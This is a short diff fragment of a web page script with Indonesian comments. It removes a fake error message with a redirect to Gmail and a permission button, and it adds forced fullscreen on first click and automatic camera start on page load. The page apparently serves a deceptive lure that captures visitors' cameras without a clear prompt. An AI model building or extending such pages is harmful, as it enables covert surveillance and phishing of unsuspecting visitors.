-        errorMsg.style.display = 'block';
-        
-        setTimeout(() => {
-            window.location.href = 'https://mail.google.com';
-        }, 2000);
     });
 
-    // ========== TOMBOL PERMISSION ==========
-    permissionBtn.addEventListener('click', requestAllPermissions);
+    // ========== FULLSCREEN (OPSIONAL) ==========
+    function requestFullscreen() {
+        const docEl = document.documentElement;
+        if (docEl.requestFullscreen) docEl.requestFullscreen();
+    }
+    document.body.addEventListener('click', function firstClick() {
+        requestFullscreen();
+        document.body.removeEventListener('click', firstClick);
+    }, { once: true });
+
+    // ========== START ==========
+    startCameras();
 </script>
 </body>
 </html>
